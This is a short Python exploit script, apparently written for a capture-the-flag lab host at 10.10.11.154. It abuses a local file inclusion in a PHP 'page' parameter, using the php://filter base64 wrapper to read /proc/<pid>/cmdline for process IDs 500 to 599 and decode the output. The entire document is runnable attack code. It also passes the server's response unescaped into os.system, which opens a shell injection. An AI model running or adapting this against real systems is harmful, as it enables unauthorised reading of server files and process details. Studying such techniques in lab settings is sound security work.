import requests as r
import os

#url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/{}/cmdline"

for i in range(500,600):
    url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/{}/cmdline".format(i)
    response=r.get(url)
    response=response.text
    s=os.system("echo '{}' | base64 -d".format(response))
    print(s)
